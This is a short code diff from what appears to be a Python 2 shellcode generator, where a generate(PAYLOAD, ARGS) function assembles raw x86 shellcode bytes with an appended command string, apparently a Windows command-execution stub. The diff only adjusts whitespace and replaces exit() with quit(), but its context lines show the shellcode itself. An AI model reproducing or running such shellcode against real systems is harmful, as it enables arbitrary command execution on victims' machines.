@@ -46,7 +46,8 @@ def generate( PAYLOAD, ARGS ):
             "\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53" 
             "\xff\xd5%s\x00" % cmd)         
         return shellcode
-    
+
     else:
+           
         print "Shellcode %s does not exist" % PAYLOAD
-        exit()
+        quit()
